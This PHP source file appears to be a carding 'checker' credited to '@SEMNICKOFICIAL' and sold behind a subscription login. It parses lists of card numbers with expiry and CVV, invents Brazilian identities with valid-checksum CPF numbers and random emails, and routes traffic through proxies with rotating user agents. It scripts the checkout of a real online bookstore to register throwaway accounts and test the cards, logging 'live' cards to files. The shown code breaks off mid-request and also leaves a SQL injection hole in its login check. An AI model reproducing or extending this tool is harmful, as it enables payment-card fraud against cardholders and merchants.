<?php
session_start();
set_time_limit(0);
include_once("../../conn.php");
date_default_timezone_set('America/Sao_Paulo');


// Verifica se o usuário está logado
if (!isset($_SESSION['usuario'])) {
    die(json_encode(array("error" => "Acesso negado - Usuário não logado")));
}

// Verifica se o usuário tem validade ativa
$usuario = $_SESSION['usuario'];
$query = mysqli_query($conn, "SELECT validade FROM usuarios WHERE usuario = '$usuario'");
$dados = mysqli_fetch_assoc($query);

if (!$dados || strtotime($dados['validade']) < time()) {
    die(json_encode(array("error" => "Acesso negado - Usuário com acesso expirado")));
}
/*/####################/*/
###### CODER: @SEMNICKOFICIAL #######
/*/###################/*/
error_reporting(0);

function capturar($separar, $inicio, $fim, $contador){
    return explode($fim, explode($inicio, $separar)[$contador])[0];
}

$cookieFile = getcwd() . '/4devs.txt';

if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

function replace_unicode_escape_sequence($match) {
    return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE');
  }
function unicode_decode($str) {
    return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str);
  }

function saveLive($cc) {
$file = dirname(__FILE__) . "/Live Cards.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }

function saveDebit($cc) {
$file = dirname(__FILE__) . "/Live Debit.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }

function saveInsuficiente($cc) {
    $file = dirname(__FILE__) . "/saveInsuficiente.txt";
    $fp = fopen($file, "a+");
    fwrite($fp, $cc . PHP_EOL);
    fclose($fp); }

function saveErro($cc) {
$file = dirname(__FILE__) . "/ invalidas.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }

function saveErro1($cc) {
$file = dirname(__FILE__) . "/Invalid Token.txt";
$fp = fopen($file, "a+");
fwrite($fp, $cc . PHP_EOL);
fclose($fp); }

$lista = $_GET['lista'];
$separarLista = explode("|", $lista);
$cc = $separarLista[0];
$mes = $separarLista[1];
$ano = $separarLista[2];
$cvv = $separarLista[3];
$bin = substr($cc, 0,6);

$re = array(
    "Amex" => "/^3[47]\d{13,14}$/",
    "elo" => "/^(4011(78|79)|43(1274|8935)|45(1416|7393|763(1|2))|50(4175|6699|67[0-7][0-9]|9000)|627780|63(6297|6368)|650(03([^4])|04([0-9])|05(0|1)|4(0[5-9]|3[0-9]|8[5-9]|9[0-9])|5([0-2][0-9]|3[0-8])|9([2-6][0-9]|7[0-8])|541|700|720|901)|651652|655000|655021)/",
    "Visa" => "/^4[0-9]{12}(?:[0-9]{3})?$/",
    "diners" => "/^3(?:0[0-5]|[68][0-9])[0-9]{11}/",
    "discovery" => "/^6(?:011|5[0-9]{2})[0-9]{12}/",
    "jcb" => "/^(?:2131|1800|35\d{3})\d{11}/",
    "Aura" => "/^(50)\d+$/",
    "Master" => "/^5[1-5]\d{14}$/",
    "hipercard" => "/^(38[0-9]{17}|60[0-9]{14})$/",
);

if (preg_match($re['Amex'], $cc)) {
    $tipo = "Amex";
} else if (preg_match($re['elo'], $cc)) {
    $tipo = "elo";
} else if (preg_match($re['Visa'], $cc)) {
    $tipo = "Visa";
} else if (preg_match($re['diners'], $cc)) {
    $tipo = "diners";
} else if (preg_match($re['discovery'], $cc)) {
    $tipo = "discovery";
} else if (preg_match($re['jcb'], $cc)) {
    $tipo = "jcb";
} else if (preg_match($re['Aura'], $cc)) {
    $tipo = "Aura";
} else if (preg_match($re['Master'], $cc)) {
    $tipo = "Master";
} else if (preg_match($re['hipercard'], $cc)) {
    $tipo = "hipercard";
} else {
    $tipo = "unknown";
}


if(strlen($ano)== 4){
$ano2 = substr($ano, -2);
}

function gerarCPF($numer) {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);

    $cpf = implode('', $cpf);
    
    if ($numer == 1) {
        return $cpf;
    }else{
        return substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2);
    }
}


function GerarNome() {
    $nomes = [
        "Joao", "Maria", "Pedro", "Ana", "Carlos", "Beatriz", "Fernando", "Juliana", "Lucas", "Camila", 
        "Marcos", "Larissa", "Ricardo", "Patricia", "Roberto", "Vanessa", "Eduardo", "Gabriela", "Alexandre", "Sofia", 
        "Bruno", "Isabela", "Andre", "Rafaela", "Diego", "Fernanda", "Thiago", "Helena", "Leonardo", "Paula", 
        "Felipe", "Clara", "Gustavo", "Lorena", "Samuel", "Luiza", "Victor", "Manuela", "Daniel", "Alice", 
        "Miguel", "Laura", "Rafael", "Bianca", "Enzo", "Valentina", "Mateus", "Yasmin", "Henrique", "Melissa", 
        "Antonio", "Esther", "Marcelo", "Dbora", "Vinicius", "Nicole", "Otavio", "Lara", "Rodrigo", "Eloa", 
        "Murilo", "Sabrina", "Arthur", "Sophia", "Luana", "Eduarda", "Marcos", "Ravi", "Breno", "Matias"
    ];
    return $nomes[array_rand($nomes)];
  }
  /*/####################/*/
###### CODER: @SEMNICKOFICIAL #######
/*/###################/*/
  function GerarSobrenome() {
    $sobrenomes = [
        "Silva", "Souza", "Oliveira", "Santos", "Pereira", "Costa", "Carvalho", "Almeida", "Ribeiro", "Fernandes", 
        "Lima", "Gomes", "Martins", "Araujo", "Barbosa", "Rocha", "Dias", "Mendes", "Freitas", "Cardoso", 
        "Monteiro", "Correia", "Castro", "Nascimento", "Moreira", "Vieira", "Pinheiro", "Teixeira", "Barros", "Duarte", 
        "Farias", "Andrade", "Cavalcante", "Moura", "Batista", "Pinto", "Macedo", "Lopes", "Miranda", "Nunes"
    ];
    return $sobrenomes[array_rand($sobrenomes)];
  }
  
  
  function GerarEmail($nome,$sobrenome){
    $provedores = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "live.com", "icloud.com"];
    $nome = strtolower($nome);
    $sobrenome = strtolower($sobrenome);
    $rand = rand(10,9999);
    $provedor = $provedores[array_rand($provedores)];
    return $nome . $sobrenome . $rand . '@' . $provedor;
  }

$nome = GerarNome();
$sobrenome = GerarSobrenome();
$email = GerarEmail($nome,$sobrenome);
$cpf = gerarCPF($numer);


$userAgents = array(
    "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
            "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
            "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
            "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))",
            "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
            "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)",
            "Mozilla/5.0 ( ; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 7.1; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; AskTB5.5)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.2; .NET4.0C; .NET4.0E)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET4.0C; .NET4.0E; InfoPath.3)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; FDM; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; Tablet PC 2.0)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; Tablet PC 2.0; InfoPath.3; .NET4.0E)",
            "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; FDM; .NET4.0C; .NET4.0E; chromeframe/11.0.696.57)",
            "Mozilla/4.0 (compatible; U; MSIE 9.0; WIndows NT 9.0; en-US)",
            "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)"
);


sleep(2);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.novaconcursos.com.br/mapa-mental/ebserh-lei-12550-pdf');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'cache-control: max-age=0',
    'priority: u=0, i',
    'referer: https://www.novaconcursos.com.br/mapas-mentais',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
$response = curl_exec($ch);
curl_close($ch);


/*/####################/*/
###### CODER: @SEMNICKOFICIAL #######
/*/###################/*/

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/campaign/add-item?sku=MM-2020-EBSERH-LEI-12550-DIGITAL');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true); // Incluir cabeçalhos na resposta
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=0, i',
    'referer: https://www.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-site',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
$response = curl_exec($ch);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/item?t=eyJpdiI6ImJmZnU1WlhGeUhxcUUvYUl2ZVlFc3c9PSIsInZhbHVlIjoiNFUrRWtURDBZd2h6TGtoQTJQU2JiVGxpR3hFc1hQcVJ4bG83VWNSZWNsams5L2ErcE03dllaUldyTnNmWmw3eHlySzd5RnMzeWphaU9neHdWSWpqcEF0VUJZNWFXT0ZROUZTZHpaSGhRcTN6MlhoMWg4bWUwMTdxalM2U1JOWGViRFhxc1p1Z1hrK2RyZUYrUUhaRTRNeVVhTHZVMTFnZXY5N2pwSzlWREptSE5BU3h1S1hubzVtTDNCUngyck1yYktET3lKRlAxWVZxcDJINGRvN253aXdXTGUySUYvNWJyZk1qc0xPa0pMbUpTeVRjdmU2UURMelJlOFQ5NEZ1ZTlpdndHaHI1UUUvbW9vMS9wUFJMODJ4elpYSUgzMis5YWl1TWtyZllVTmJVcnJBQ2d5azZSZXE0NkdRWjFlTjdHZGd3WjRZQ3lYZmlMUUJQSCsvZkhwc3U1d09SYk8rdzU1WmxJZzl0Y1JCNmlqcW9GQW9UdTJRVGJoazQ3Qk9NWFN4ZExCY0wzaTFFTStkYnh3K21rWjRGNkxxbzI2ZmlBWDA5anVoZ1NxWVlXbnAxeVY4dk9GRTlvNFNSVEZ2RjFVV3RpcGhJYzRuT09hRDNVUHh6WGc2ZzkxZW9QaFRMZVExOVFOZjk2ZHlYK1o5UlpDMWRNVVVscEM5TWQ4cFJiUXJXYjNZOGtUMXd3YzBmYXMrNFJzT3lTK28vZ1Joa0JIaEFVVTVuMXU5VmRqcU5JanUvSWZ6VmEwaDkyb3BrMy9Mem1ybnl2UVVTcFR4c3AzYXBjWmc2WHNTN2haY1ptK3JRSnkxS0NPaFJqOEZjQ0VsVXZVQ0xqNW1zZDZtZVBlYk1ydm5vQkxuTHVJWkU0V2UxRE9LeUxSU2ZMazlBWUxvY21ucFloZDlEMEtYR1poUytFdm5tT3hmakRRYmEiLCJtYWMiOiI2MmNiMDAyZTQyOGZhYzE3OGE2OWMxZmYyNDgwMzg1MTFiOTQ4YWM0MzRhY2E3NzZmMjg2OWNjMzRhZWViN2FiIiwidGFnIjoiIn0=');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type: application/json',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"coupon":null}');
$response = curl_exec($ch);
curl_close($ch);

/*/####################/*/
###### CODER: @SEMNICKOFICIAL #######
/*/###################/*/

sleep(5);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/auth/register');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type: application/json',
    'origin: https://checkout.novaconcursos.com.br',
    'priority: u=1, i',
    'referer: https://checkout.novaconcursos.com.br/',
    'sec-ch-ua: "Not(A:Brand";v="99", "Microsoft Edge";v="133", "Chromium";v="133"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: '.$userAgents.'',
]);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"name":"'.$nome.' '.$sobrenome.'","email":"'.$email.'","password":"Flamengo$2","password_confirmation":"Flamengo$2","accept_terms":true,"token":"03AFcWeA6gtO9K8t_gzc46RLW-YuD9fTKrircK2mgpe7gN4hmSQ3S4EY_oB0euqtt3fWFVE9CSk2vn7oDkRR32PVypl854fkMkvtD75Zx5_4KfxzBsuoRt9GCQxDKDr7YUcjOrMid8jhBxyix5G6GfdurM-5h1p8GvgWZrhl9ShbTLebfAkoiAzRkaiRz_t5apxPuQFvkopgxi6kCP2y1Ik3Y4zMn7i-YwLWAuxT60ZuLGnURc-wm0TeCZAAiWhbn-oym98CvyLaxQ6JHYMtq5_yBp5ZC93No7QS3Nl4PEFFuzQtPnrNMc_AsMPZ41qDm3A4xHnvDiAe3aD7l83A2zMYCnxECKk2cUOfijpjpiNc7vh0fJKvUzT6J8yXcN1Kg-VbwUcTczpuZ2KnPjygQ_FWF8-grOMPJQSR8oh4fDaPn-tZPquufksBRRkCQbguL3zd-YgDacdF4rKS3bnQpE6gw6LcOsmw98NV1Vvazj5u8spk489oUqsM8fPLjg7bX_gAGbrhfghq15iNWO6xGzCGSensfQmCOGljwx00hjZKn1Dv2fiMeUA-GtQqd4U98PoAtaCodX_ZrB4unGG2R_-BJG2D4caQxUo0Mdx7IxXBqqHGB5E4pPfD0PIVhpi2AATdM-_UKBa54YQ7op9pAIjiLuu0R0uE3a1ks9mhwoWCRweHmtnr1rm61otYJ2vkh8hzj6DvFY3h1zrvEmEtZA6Ac8sc12pB94p_gzVbZDPAmzBN5Z5DOl3f1LBLupcjzXg0iRZsjy4lG18ct4c1pRpgEBeXUFYxGQjjxAF_VCMMVboU6kNYLzhvEC_sM1tYOd0wCisaQa_2MwoBkaN4PioT_xW7w0sLNnypSJcrBqAPpUPUxlrT1vXewUI9sPS83Xqdt8ZyCQUpfdOx_R8B1cY1aVxmSQLxG8t2zPnWa0lxR09pwSDdW-80P4xUcYQLKbP1pvhHikLB4gEHXFjEo66mNyqguSYKLX8OsjHjIo08shGEY-v_AtBZSQtLiWegGas-Yc0ly1X1usPHLljlO7VUUFtCmH7-3b5fVmXAMMERXvQcGaOT4yy91zPEcGlW4dq-Rx3SL_M7Vh5hFA-cy8436MRtETYb7Y7GpClQKqU_HEVFI0e5PKBESmTDFOlFvXH5CHx9-mEBfpbkjCid7NzrupJNrSEC5uXgMHJHRwk2Cl8XYQXFss8nKppTTA5su5wESGzCMDvFMnhmto_9c7GdLbEq_q999Z7wd_6s6D2baLSBzHZF1HV1B_T1qhDL6PzJLXijkkBS-teim0CHiYkmgW6kxE6SuXZ6EpmAxUOWLq5h1fODhj6HVbIWGHmM3le_mcj47vw_jjSegODMz5djIJiGffzxlWnjj0Rn0e1T55t3SL3lQ92yCA7mrvyKOxXsNNBwshzF_GCtm8B_8BPZCQsCe8i02qZCPZ5tdGqRRYvATZnnGtgGzYJiDXlO7J5eB1Wgaa2J9jPig0ZCEQsCT9uEXASbCiYUctCZ1eY0Pbc162xezecdSYZrra-v-tbvYbnVA5Ft-CBWvWVNnnRwOUq5luD0P3W8aYTs3N4u73VrToNEPhLqWETwX9jlhXnv6sQE8gZ2UeVSvG96uaVoxxr3mzVAcSfrUj_xAFNm7A-J72uAO1EmzmyqYCa1STdATGnU83cdwBqhRkUYSgRUceFL_ISaOu4mDS3_7KrCIWwLrAum8MCZp0b-sKhaEmz-qYPTVK3xPPEmP30ASq-mRH27Tr2C4IlcwuEKBF9PErZd8RitlCGwl86AyVqwIjTBsrlRaF3-ZLIGXgQFy9vjZoaR1PU9nO2uDWc9MlrSEcIeZ1xpF5qWNQI4m1G6u5kWKUV93b4cOFFQFTNvtm_D-zYvhpmd8vBdPPveRtF6fKzgChpyZeqTAyuDuO0OimjlFRZChXUDyFu9-pfSEcm4n6EHob07J3dIlYTmtM7VaLCpOZmb3Y4JClTPGQpl9zvyf4lqDgRiHnw2_4HEhKpOS_pCPSGgvhH8yzIm2m2FcXi_GEn3Fzykxr8lIRwfYVZmZrtiQxlxmIJ501YuiFGrcGSZO2bhIn5h7iSpqvCye-aIIKYKHlOheNScPuXd6CsjVufwYIcl6z"}');
$response = curl_exec($ch);
$token = json_decode($response, true);
$bearer = $token['token'] ?? null;


/*/####################/*/
###### CODER: @SEMNICKOFICIAL #######
/*/###################/*/


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.novaconcursos.com.br/api/v1/cart/customer');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
